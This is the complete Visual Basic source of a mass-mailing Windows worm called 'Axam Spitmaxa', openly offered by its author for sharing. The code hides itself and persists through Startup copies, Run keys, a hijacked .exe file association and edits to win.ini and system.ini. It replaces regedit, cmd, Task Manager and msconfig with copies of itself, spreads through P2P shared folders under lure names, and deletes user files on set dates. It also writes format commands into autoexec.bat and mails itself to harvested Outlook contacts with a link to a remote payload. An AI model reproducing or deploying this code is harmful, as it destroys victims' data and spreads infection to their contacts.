VERSION 5.00
Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
Begin VB.Form Axam 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   0  'None
   ClientHeight    =   660
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1275
   Icon            =   "Axam.frx":0000
   ScaleHeight     =   660
   ScaleWidth      =   1275
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin MSMAPI.MAPIMessages MAPIMessages1 
      Left            =   600
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      AddressEditFieldCount=   1
      AddressModifiable=   0   'False
      AddressResolveUI=   0   'False
      FetchSorted     =   0   'False
      FetchUnreadOnly =   0   'False
   End
   Begin MSMAPI.MAPISession MAPISession1 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      DownloadMail    =   -1  'True
      LogonUI         =   -1  'True
      NewSession      =   0   'False
   End
End
Attribute VB_Name = "Axam"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'VIRUS NAME: Axam Spitmaxa
'AUTHOR NAME: Melhacker

'Comment:
' I have writo this worm for 3+ hours. Since I was tested this
' worm, it seem work well. This source code is not original
' W32.HLLW.MMaax@mm but it's already modify for next variant (B).
' So, if you have any virus new internet worm source code feel
' free to share with us.

' For description about this virus please refered to anti-virus
' description. I'm too lazy to explain it.

Dim APE
Dim HKC As String
Dim HKU As String
Dim HKM As String
'Option Explicit
Private path As String * 255
Private savepath As String
Private ReadWindir As Long
Private Applicate As String
Private Declare Function GetWindowsDirectory Lib "KERNEL32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetSystemDirectory Lib "KERNEL32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetPrivateProfileString Lib "KERNEL32" Alias "GetPrivateProfileStringA" _
(ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, _
ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long

Private Declare Function OpenMutex Lib "kernel32.dll" Alias "OpenMutexA" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Boolean, ByVal lpName As String) As Long
Private Declare Function ReleaseMutex Lib "kernel32.dll" (ByVal hMutex As Long) As Long
Private Declare Sub CloseHandle Lib "KERNEL32" (ByVal hPass As Long)
Private Declare Function CreateMutex Lib "kernel32.dll" Alias "CreateMutexA" (ByVal lpMutexAttributes As Any, ByVal bInitialOwner As Boolean, ByVal lpName As String) As Long

Public LongMutex As Long

Private Declare Function WritePrivateProfileString Lib "KERNEL32" Alias "WritePrivateProfileStringA" _
(ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, _
ByVal lpFileName As String) As Long

Private Sub Form_Load()
On Error Resume Next
Dim ws, r1, r2, w1, r3, w2, w3, w4, w5, w6, w7, w8, w9
App.TaskVisible = False
App.Title = ""
If ProgramRun = True Then End ' Buat satu Mutex

Set ws = CreateObject("WScript.Shell")
APE = App.path & "\" & App.EXEName & ".exe"
HKC = "HKEY_CLASSES_ROOT"
HKU = "HKEY_CURRENT_USER"
HKM = "HKEY_LOCAL_MACHINE"
SearchFirewall ' Batalkan semua proses anti-virii

r1 = ws.regread(HKU & "\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup")
FileCopy APE, r1 & "\Axam.exe"
Atribut r1 & "\Axam.exe"

r2 = ws.regread(HKU & "\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\AppData")
FileCopy APE, r2 & "\Axam.exe"
Atribut r2 & "\Axam.exe"

Dim al, rn
For al = 65 To 97
FileCopy APE, Chr(Int(al)) & ":\axam_screensaver.scr"
Next al

r3 = ws.regread(HKU & "\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")

w1 = ws.regwrite(HKM & "\Software\Microsoft\Windows\CurrentVersion\Run\sysaxam32", r2 & "\Axam.exe")

w2 = ws.regwrite(HKC & "\.exe\", "Spitmaxa")
w3 = ws.regwrite(HKC & "\Spitmaxa\")
w4 = ws.regwrite(HKC & "\Spitmaxa\DefaultIcon\")
w9 = ws.regwrite(HKC & "\Spitmaxa\DefaultIcon\", "%1")
w5 = ws.regwrite(HKC & "\Spitmaxa\shell\")
w6 = ws.regwrite(HKC & "\Spitmaxa\shell\open\")
w7 = ws.regwrite(HKC & "\Spitmaxa\shell\open\command\")
w8 = ws.regwrite(HKC & "\Spitmaxa\shell\open\command\", r2 & "\Axam.exe ""%1"" %*")

If Day(Now) = 11 Then ' Birthdate Hakim
Dim kl, ki(20) As String, kk, kj
ki(1) = "*.dll"
ki(2) = "*.jpg"
ki(3) = "*.doc"
ki(4) = "*.mdb"
ki(5) = "*.bmp"
ki(6) = "*.lnk"
ki(7) = "*.sys"
ki(8) = "*.bin"
ki(9) = "*.mp3"
ki(10) = "*.xls"
ki(11) = "*.pif"
ki(12) = "*.zip"
ki(13) = "*.cab"
ki(14) = "*.avi"
ki(15) = "*.mpg"
ki(16) = "*.vbs"
ki(17) = "*.gif"
ki(18) = "*.reg"
ki(19) = "*.wma"
ki(20) = "*.wmv"
For kk = 1 To 20
For kl = 65 To 97
kj = ki(kk)
Kill Chr(Int(kl)) & ":\" & kj
Next kl
Next kk
End If

If Day(Now) = 2 Then
Mesej "Apa yang membuatkan seseorang pemerintah itu menjadi tamak dan angkuh? " _
& "Jawapannya boleh dilihat pada pemerintah barat.", 64, "W32.Axam.B@mm"
End If

If Day(Now) = 1 And Day(Now) = 4 And Day(Now) = 8 And Day(Now) = 12 And Day(Now) = 16 And Day(Now) = 20 And Day(Now) = 24 And Day(Now) = 28 Then
Open "C:\Autoexec.bat" For Append As #1
Print #1, "echo off"
Print #1, "cls"
Print #1, "echo -=<####################################>=-"
Print #1, "echo ( AxAm WOrm are ReAdY tO DeStrOy YoUr PC )"
Print #1, "echo -=<####################################>=-"
Print #1, "pause >>NUL"
Print #1, "format /q D:"
Print #1, "format /q C:"
Close #1
Dim Se(25) As String, co, Ext
Se(1) = "avi"
Se(2) = "bmp"
Se(3) = "dll"
Se(4) = "doc"
Se(5) = "xls"
Se(6) = "ppt"
Se(7) = "jpg"
Se(8) = "mp3"
Se(9) = "zip"
Se(10) = "cab"
Se(11) = "ocx"
Se(12) = "vxd"
Se(13) = "gif"
Se(14) = "htm"
Se(15) = "mdb"
Se(16) = "wma"
Se(17) = "wmv"
Se(18) = "sys"
Se(19) = "vbs"
Se(20) = "rtf"
Se(21) = "txt"
Se(22) = "lnk"
Se(23) = "pif"
Se(24) = "dat"
Se(25) = "rar"
For co = 1 To 25
Ext = Se(co)
Kill App.path & "\*." & Ext
Next co
Kill r3 & "\*.*"

Else

Mesej "W32.HLLW.Maax.B@mm" & vbCrLf _
& "W32.P2P.B.Axam" & vbCrLf _
& "Win32.Axam.B.Worm" & vbCrLf _
& "and whatever...", 0, "Axam Spitmaxa Worm II"
'SetAttr "C:\*.*", vbNormal
'Kill "C:\*.*"
End If
Call WriteINI
End Sub

Function WriteINI() 'This will write a INI file as a startup
On Error Resume Next
Dim iret As Long, txtResult, w As String, s As String
FileCopy APE, Windir & "\setup_axm.exe"
FileCopy APE, Sysdir & "\iosys.exe"

w = Windir & "\setup_axm.exe"
s = Sysdir & "\iosys.exe"
FileCopy APE, w
FileCopy APE, s
iret = WritePrivateProfileString("windows", "load", w, Windir & "\win.ini")
txtResult = "Return Code: " & iret

iret = WritePrivateProfileString("windows", "run", s, Windir & "\win.ini")
txtResult = "Return Code: " & iret

iret = WritePrivateProfileString("boot", "shell", "Explorer.exe setup_axm.exe", Windir & "\system.ini")
txtResult = "Return Code: " & iret

Call P2P
End Function


Function P2P()
On Error Resume Next
Dim ws, r1
Set ws = CreateObject("WScript.Shell")
r1 = ws.regread(HKM & "\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")

FileCopy APE, r1 & "\KMD\My Shared Folder\AXM_WORM.exe"        'KMD
FileCopy APE, r1 & "\Kazaa\My Shared Folder\FlashMXPlayer.exe"      'KaZaA
FileCopy APE, r1 & "\KaZaA Lite\My Shared Folder\XiaoXiao.exe" 'KaZaA Lite
FileCopy APE, r1 & "\Morpheus\My Shared Folder\Bugbear_Removal.exe"   'Morpheus
FileCopy APE, r1 & "\Grokster\My Grokster\SEXisFUN.exe"        'Grokster
FileCopy APE, r1 & "\BearShare\Shared\setup.exe"            'BearShare
FileCopy APE, r1 & "\Edonkey2000\Incoming\RA2_Update.exe"        'Edonkey2000
FileCopy APE, r1 & "\limewire\Shared\FixRUNDLL bugs.exe"            'LimeWire
Call DSS
End Function

Function DSS() 'Disable System Security Related
On Error Resume Next
Dim r1, ws
Set ws = CreateObject("WScript.Shell")
'Overwrite Windows Registry Editor
If FileExist(Windir & "\regedit.exe") Then
Kill Windir & "\regedit.exe"
FileCopy APE, Windir & "\regedit.exe"
ElseIf FileExist(Windir & "\regedit.com") Then
Kill Windir & "\regedit.com"
FileCopy APE, Windir & "\regedit.com"
ElseIf Windir & "\regedt32.exe" Then
Kill Windir & "\regedt32.exe"
FileCopy APE, Windir & "\regedt32.exe"
ElseIf Windir & "\regedt32.com" Then
Kill Windir & "\regedt32.com"
FileCopy APE, Windir & "\regedt32.com"
ElseIf Sysdir & "\regedt32.exe" Then
Kill Sysdir & "\regedt32.exe"
FileCopy APE, Sysdir & "\regedt32.exe"
ElseIf Sysdir & "\regedt32.com" Then
Kill Sysdir & "\regedt32.com"
FileCopy APE, Sysdir & "\regedt32.com"
Else
End If

'Overwrite Command Prompt/MS-DOS Prompt
If FileExist(Windir & "\command.com") Then
Kill Windir & "\command.com"
FileCopy APE, Windir & "\command.com"
ElseIf FileExist("C:\command.com") Then
Kill "C:\command.com"
FileCopy APE, "C:\command.com"
ElseIf FileExist(Sysdir & "\cmd.exe") Then
Kill Sysdir & "\cmd.exe"
FileCopy APE, Sysdir & "\cmd.exe"
ElseIf FileExist(Sysdir & "\command.com") Then
Kill Sysdir & "\command.com"
FileCopy APE, Sysdir & "\command.exe"
Else
End If

'Overwrite shortcut files
r1 = ws.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Start Menu")
If FileExist(r1 & "\Programs\Accessories\Command Prompt.lnk") Then
Kill r1 & "\Programs\Accessories\Command Prompt.lnk"
FileCopy APE, r1 & "\Programs\Accessories\Command Prompt.lnk.exe"
ElseIf FileExist(r1 & "\Programs\Accessories\MS-DOS Prompt.pif") Then
Kill r1 & "\Programs\Accessories\MS-DOS Prompt.lnk"
FileCopy APE, r1 & "\Programs\Accessories\MS-DOS Prompt.lnk.exe"
Else
End If

'Overwrite Task Manager
If FileExist(Sysdir & "\taskmgr.exe") Then
Kill Sysdir & "\taskmgr.exe"
FileCopy APE, Sysdir & "\taskmgr.exe"
Else
End If

'Overwrite MSConfig.exe
If FileExist(Sysdir & "\msconfig.exe") Then
Kill Sysdir & "\msconfig.exe"
FileCopy APE, Sysdir & "\msconfig.exe"
Else
End If

Kill "A:\*.*" 'Delete all files in floppy disk

Call AxamOut
End Function

Function AxamOut()
On Error Resume Next
Dim HTML As String, Sb(20) As String, r, Subjek, OUT, MAP, OA, Address, ADDList, Email, All, Harvest
Dim Mel, eMel, Kepil
Sb(1) = "WHEN US GOVERMENT TO STOP THE INVADED IN IRAQ?!"
Sb(2) = "News: US vs Iraq Issue"
Sb(3) = "Strike on Iraq"
Sb(4) = "Hi! ;)"
Sb(5) = "Good Idea For ya!"
Sb(6) = "DAA Holding have an Idea for Bussiness man"
Sb(7) = "Great Job for Professional Programmer"
Sb(8) = "Trade and Care about customer!"
Sb(9) = "Don't missed Logon to DAABussiness.com"
Sb(10) = "Are you a Bussiness man?"
Sb(11) = "How to make a money in one day?"
Sb(12) = "Care to trade world map?"
Sb(13) = "How to prevent from Pirate CD!"
Sb(14) = "Job for you!"
Sb(15) = "Do you have an enough salaries for you job?"
Sb(16) = "Don't waste your money!"
Sb(17) = "HAVE A NICE DAY!"
Sb(18) = "Why US invade on Iraq?"
Sb(19) = "No More Blood!"
Sb(20) = "HOW TO PREVENT YOUR EMAIL FROM VIRUSES?"
Randomize
r = Int((Rnd * 20) + 1)
Subjek = Sb(r)

HTML = "<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">" & vbCrLf _
& "<HTML><HEAD>" & vbCrLf _
& "<META http-equiv=Content-Type content=""text/html; charset=iso-8859-1"">" & vbCrLf _
& "<META content=""MSHTML 6.00.2600.0"" name=GENERATOR>" & vbCrLf _
& "<STYLE></STYLE>" & vbCrLf _
& "</HEAD>" & vbCrLf _
& "<BODY bgColor=#ffffff>" & vbCrLf _
& "<DIV>Dear Mr/Mrs/Sir/Mdm,</DIV>" & vbCrLf _
& "<DIV>&nbsp;</DIV>" & vbCrLf _
& "<DIV>Are you tired to get the customer. It is important to know how to make your bussiness more efficient. " & vbCrLf _
& "To get a tips and more advise. You can download it from the attachment or just <A " _
& "href=""http://vx.netlux.org/~melhacker/axamtips.exe"">click here</A> to download " _
& "from our FTP site.</DIV>" & vbCrLf _
& "<DIV>&nbsp;</DIV>" & vbCrLf _
& "<DIV>Regard, </DIV>" & vbCrLf _
& "<DIV>Yamamoto Hashimura, </DIV>" & vbCrLf _
& "<DIV>Software Engineer of DAA Holding</DIV></BODY></HTML>"
'Outlook.Application 'MAPI

OUT = "" & Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) & ""
MAP = "" & Chr(77) + Chr(65) + Chr(80) + Chr(73) & ""
Set OA = CreateObject(OUT)
If OA = "Outlook" Then
    Set Address = OA.GetNameSpace(MAP)
    Set ADDList = Address.AddressLists
        For Each Email In ADDList
        With Email
            If .AddressEntries.Count <> 0 Then
                All = .AddressEntries.Count
                    For Harvest = 1 To All
                        Set Mel = OA.CreateItem(0)
                        Set eMel = .AddressEntries(Harvest)
                    With Mel
                        .to = eMel.Address
                        HantarEmail eMel.Address, "" & Subjek & "", "Let say together! No War for Oil! No Bush is mean the world peace!", Windir & "\setup_axm.exe"
                        .subject = Subjek
                        .HTMLBody = HTML
                        Set Kepil = Mel.Attachments
                        .DeleteAfterSubmit = True
                        Kepil.Add APE, 1, 1, "initial.msi"
                            If .to <> "" Then
                                .Send
                            End If
                    End With
                    Next
            End If
        End With
        Next
End If
End Function

Function Windir()
Applicate = APE
ReadWindir = GetWindowsDirectory(path, 255)
savepath = Left$(path, ReadWindir)
Windir = savepath
End Function

Function Sysdir()
Applicate = APE
ReadWindir = GetSystemDirectory(path, 255)
savepath = Left$(path, ReadWindir)
Sysdir = savepath
End Function

Private Function FileExist(ByRef sFname) As Boolean
If Len(Dir(sFname, 16)) Then FileExist = True Else FileExist = False
End Function

Public Function HantarEmail(sendto As String, subject As String, _
text As String, Kepil As String) As Boolean
'Add The MAPI Components and
'add a MAPI Session and MAPI mail control to your form

On Error GoTo ErrHandler
With MAPISession1
            .DownLoadMail = False
            .LogonUI = True
            .SignOn
            .NewSession = True
            MAPIMessages1.SessionID = .SessionID
End With
With MAPIMessages1
        .Compose
        .RecipAddress = sendto
        .AddressResolveUI = True
        .ResolveName
        .MsgSubject = subject
        .MsgNoteText = text
        .AttachmentPathName = Kepil
        .Send False
End With
sendmail = True
ErrHandler:
End Function

Private Sub Form_Unload(Cancel As Integer)
Dim ReturnReleaseLong As Long
Dim ReturnCloseLong As Long
    If OpenMutex(0, True, "-~~=< REKCAHLEM >=~~-") Then
        ReturnReleaseLong = ReleaseMutex(LongMutex)
        CloseHandle LongMutex
    End If
End Sub

Private Function ProgramRun() As Boolean
Dim ReturnReleaseLong As Long
Dim ReturnCloseLong As Long
    If OpenMutex(0, True, "-~~=< REKCAHLEM >=~~-") Then
        ReturnReleaseLong = ReleaseMutex(LongMutex)
         CloseHandle LongMutex
        ProgramRun = True
    Else
        LongMutex = CreateMutex(ByVal 0&, False, "-~~=< REKCAHLEM >=~~-")
        ProgramRun = False
    End If
End Function


